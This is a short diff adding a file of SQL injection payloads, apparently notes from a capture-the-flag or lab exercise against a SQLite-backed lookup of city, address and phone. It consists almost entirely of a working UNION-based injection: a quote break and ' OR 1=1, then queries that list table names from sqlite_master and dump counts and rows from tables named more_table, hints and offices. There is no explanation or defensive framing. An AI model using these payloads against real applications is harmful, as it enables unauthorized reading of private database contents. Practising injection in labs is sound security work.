@@ -1,0 +1,16 @@
+select city, address, phone from users where city=' 
+' OR 1=1
+Union
+SELECT tbl_name as city, tbl_name as address, tbl_name as phone  FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
+UNION 
+select cast(count(*) as text), cast(count(*) as text), cast(count(*) as text) from more_table 
+UNION 
+select *, cast(count(*) as text) as phone from more_table --
+UNION 
+select cast(count(*) as text), cast(count(*) as text), cast(count(*) as text) from hints--
+UNION
+select cast(count(*) as text), cast(count(*) as text), cast(count(*) as text) from offices --
+
+
+
+
